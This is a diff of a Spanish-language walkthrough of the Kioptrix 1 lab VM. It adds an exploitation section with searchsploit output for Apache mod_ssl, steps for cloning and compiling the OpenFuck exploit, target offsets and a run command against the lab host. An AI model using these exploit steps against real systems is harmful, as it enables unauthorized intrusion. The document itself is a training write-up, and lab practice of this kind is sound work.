@@ -1,8 +1,8 @@
 ---
 layout: post
 title: Kioptrix1 - Walkthrough
-date: 2020-30-01 20:44
-description: [Walkthrough] Kioptrix 1
+date: 2020-01-30 20:44
+description: Walkthrough - Kioptrix 1
 toc: true
 comments: true
 tags: 
@@ -112,8 +112,8 @@ La conexión por SSH funciona pero hay un error de cifrado, voy a averiguar sobr
 ```console
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
-+ Target IP:          10.0.0.97
-+ Target Hostname:    10.0.0.97
++ Target IP:          10.0.0.107
++ Target Hostname:    10.0.0.107
 + Target Port:        80
 + Start Time:         2020-02-03 15:16:08 (GMT-3)
 ---------------------------------------------------------------------------
@@ -165,31 +165,31 @@ By The Dark Raver
 -----------------
 
 START_TIME: Mon Feb  3 15:16:34 2020
-URL_BASE: http://10.0.0.97/
+URL_BASE: http://10.0.0.107/
 WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
 
 -----------------
 
 GENERATED WORDS: 4612
 
----- Scanning URL: http://10.0.0.97/ ----
-+ http://10.0.0.97/~operator (CODE:403|SIZE:273)
-+ http://10.0.0.97/~root (CODE:403|SIZE:269)
-+ http://10.0.0.97/cgi-bin/ (CODE:403|SIZE:272)
-+ http://10.0.0.97/index.html (CODE:200|SIZE:2890)
-==> DIRECTORY: http://10.0.0.97/manual/
-==> DIRECTORY: http://10.0.0.97/mrtg/
-==> DIRECTORY: http://10.0.0.97/usage/
+---- Scanning URL: http://10.0.0.107/ ----
++ http://10.0.0.107/~operator (CODE:403|SIZE:273)
++ http://10.0.0.107/~root (CODE:403|SIZE:269)
++ http://10.0.0.107/cgi-bin/ (CODE:403|SIZE:272)
++ http://10.0.0.107/index.html (CODE:200|SIZE:2890)
+==> DIRECTORY: http://10.0.0.107/manual/
+==> DIRECTORY: http://10.0.0.107/mrtg/
+==> DIRECTORY: http://10.0.0.107/usage/
 
----- Entering directory: http://10.0.0.97/manual/ ----
+---- Entering directory: http://10.0.0.107/manual/ ----
 (!) WARNING: Directory IS LISTABLE. No need to scan it.
     (Use mode '-w' if you want to scan it anyway)
 
----- Entering directory: http://10.0.0.97/mrtg/ ----
-+ http://10.0.0.97/mrtg/index.html (CODE:200|SIZE:17318)
+---- Entering directory: http://10.0.0.107/mrtg/ ----
++ http://10.0.0.107/mrtg/index.html (CODE:200|SIZE:17318)
 
----- Entering directory: http://10.0.0.97/usage/ ----
-+ http://10.0.0.97/usage/index.html (CODE:200|SIZE:3704)
+---- Entering directory: http://10.0.0.107/usage/ ----
++ http://10.0.0.107/usage/index.html (CODE:200|SIZE:3704)
 
 -----------------
 END_TIME: Mon Feb  3 15:17:00 2020
@@ -205,9 +205,85 @@ DOWNLOADED: 13836 - FOUND: 6
  - Sistema operativo Red Hat.
  - Multi Router Traffic Grapher (MRTG 2.9.6) corriendo.
  - Webalizer 2.01 corriendo.
- - mod_ssl/2.8.4 que podría permitir RCE.
+ - **mod_ssl/2.8.4 que podría permitir RCE.**
  - Pareciera que un Wordpress está corriendo pero no encontré la raiz del sitio.
- - El archivo 
 
 ## **Explotación**
+
+Voy a ir por el camino más simple, en este caso es buscar vulnerabilidad para `Apache mod_ssl`. El comando searchsploit busca vulnerabilidades según la cadena de texto que se escriba a continuación del comando. En este caso la búsqueda va a ser mod_ssl 2.8, basado en la versión de mod_ssl que me facilitó NMAP.
+
+> **`searchsploit mod_ssl 2.8.`**
+```console
+---------------------------------------------------------------------------- ---------------------------------
+ Exploit Title | Path
+               | (/usr/share/exploitdb/)
+---------------------------------------------------------------------------- ---------------------------------
+Apache mod_ssl 2.8.x - Off-by-One HTAccess Buffer Overflow                  | exploits/multiple/dos/21575.txt
+Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow        | exploits/unix/remote/21671.c
+Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)  | exploits/unix/remote/764.c
+Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)  | exploits/unix/remote/47080.c
+---------------------------------------------------------------------------- ---------------------------------
+```
+
+Bien, hay 1 una vulnerabilidad que solo sirve para hacer una ataque de DOS, como en este caso la idea es lograr escalar hacia el usuario root entonces esa vulnerabilidad no va a servir. Solo quedan 3 y son bastante parecidas además de ser remotas, voy a ir con `Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)` la ruta es `exploits/unix/remote/764.c` y la manera más fácil de llegar al código fuente es ejecutando el comando `searchsploit` seguido del parámetro `-m` y el número asignado a la vulnerabilidad, en este caso `764`. Este parámetro permite copiar el código fuente de la vulnerabilidad en la carpeta donde se está parado.
+
+>**`searchsploit -m 764`**
+
+```console
+ Exploit: Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)
+      URL: https://www.exploit-db.com/exploits/764
+     Path: /usr/share/exploitdb/exploits/unix/remote/764.c
+File Type: C source, ASCII text, with CRLF line terminators
+
+Copied to: /root/764.c
+
+```
+Una vez que tenemos el código fuente de exploit solo resta compilarlo, asegurarse de tener instalado `GCC` y `libssl-dev` o va a fallar la compilación.
+
+Bien, obviamente la compilación falló. Resulta que el código fuente está desactualizado y es jodido compilarlo con la versión de gcc y libssl de hoy en día (2020) así que me bajé una versión de Kali de 2016 que es más o menos el año en el cual se creó está VM y la compilación siguiió fallando.
+
+Finalmente al googlear 5 minutos aparecieron dos páginas que me ayudaron:
+
+* [OpenLuck](https://github.com/heltonWernik/OpenLuck) Este tipo (Helton Wernik) se tomó el tiempo de actualizar el código fuente además de dar instrucciones para su compilación:
+    1. Download OpenFuck.c
+    : git clone https://github.com/heltonWernik/OpenFuck.git
+
+    2. Install ssl-dev library
+    : apt-get install libssl-dev
+
+    3. It's Compile Time
+    : gcc -o OpenFuck OpenFuck.c -lcrypto
+
+    4.Running the Exploit
+    : ./OpenFuck
+
+```console
+*******************************************************************
+* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
+*******************************************************************
+* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+* #hackarena  irc.brasnet.org                                     *
+* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+*******************************************************************
+
+: Usage: ./OpenFuck target box [port] [-c N]
+
+  target - supported box eg: 0x00
+  box - hostname or IP address
+  port - port for ssl connection
+  -c open N connections. (use range 40-50 if u dont know)
+```
+
+
+Acá es donde se vuelve importante la versión de sistema operativo y Apache que enumeramos previamente:
+```console
+0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
+0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
+```
+
+Voy a ir por la primera, el comando sería:
+
+>**`./OpenFuck 0x6a 100.0.0.107 -c 50`**
 
